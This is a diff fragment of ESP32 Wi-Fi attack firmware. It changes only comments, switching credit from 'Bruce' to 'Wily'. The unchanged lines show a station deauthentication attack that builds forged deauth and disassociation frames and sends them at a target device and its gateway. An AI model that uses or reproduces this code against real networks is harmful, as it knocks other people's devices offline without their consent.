@@ -152,7 +152,7 @@ void stationDeauth(ScanHosts::Host host) {
         if (channel == 0) channel = 1;
     }
 
-    // Get gateway MAC (using Bruce's original function)
+    // Get gateway MAC (using Wily's original function)
     getGatewayMAC(gatewayMAC);
 
     // Convert target MAC
@@ -162,7 +162,7 @@ void stationDeauth(ScanHosts::Host host) {
     bool enhanced_mode = tryMonitorMode(channel);
 
     if (!enhanced_mode) {
-        // Fallback to Bruce's original AP mode
+        // Fallback to Wily's original AP mode
         WifiCommon::disconnect();
         delay(10);
         WiFi.mode(WIFI_AP);
@@ -186,7 +186,7 @@ void stationDeauth(ScanHosts::Host host) {
     buildOptimizedDeauthFrame(deauth_sta_to_ap, gatewayMAC, MAC, gatewayMAC, 0x07, false);
     buildOptimizedDeauthFrame(disassoc_sta_to_ap, gatewayMAC, MAC, gatewayMAC, 0x07, true);
 
-    // Bruce's original display code (keep same structure)
+    // Wily's original display code (keep same structure)
     drawMainBorderWithTitle("Ataque Deauth");
     tft.setTextSize(FP);
     padprintln("Tentando deauth alvo.");
@@ -223,7 +223,7 @@ void stationDeauth(ScanHosts::Host host) {
             esp_wifi_80211_tx(WIFI_IF_STA, deauth_sta_to_ap, 26, false);
             esp_wifi_80211_tx(WIFI_IF_STA, disassoc_sta_to_ap, 26, false);
         } else {
-            // AP mode: Use Bruce's original send_raw_frame
+            // AP mode: Use Wily's original send_raw_frame
             send_raw_frame(deauth_ap_to_sta, 26);
             send_raw_frame(disassoc_ap_to_sta, 26);
             send_raw_frame(deauth_sta_to_ap, 26);
